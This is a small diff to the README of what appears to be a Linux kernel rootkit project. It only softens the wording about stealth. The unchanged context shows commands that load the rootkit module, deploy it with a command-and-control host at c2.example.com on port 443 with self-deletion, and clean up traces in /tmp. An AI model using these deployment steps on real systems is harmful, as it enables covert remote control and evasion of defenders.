@@ -65,7 +65,7 @@ sudo ./deploy_rootkit.sh --verbose
 
 ### Advanced Usage
 ```bash
-# Ultimate stealth deployment
+# Stealth deployment
 sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete
 
 # Deploy with verbose output then self-destruct
@@ -95,7 +95,7 @@ sudo insmod epirootkit.ko
 
 ## Self-Cleanup Features
 
-The deployment script includes advanced stealth capabilities:
+The deployment script includes stealth capabilities:
 
 ### Trace Cleanup
 - **Temp files**: Removes all `/tmp/jules_est_bo_*` files
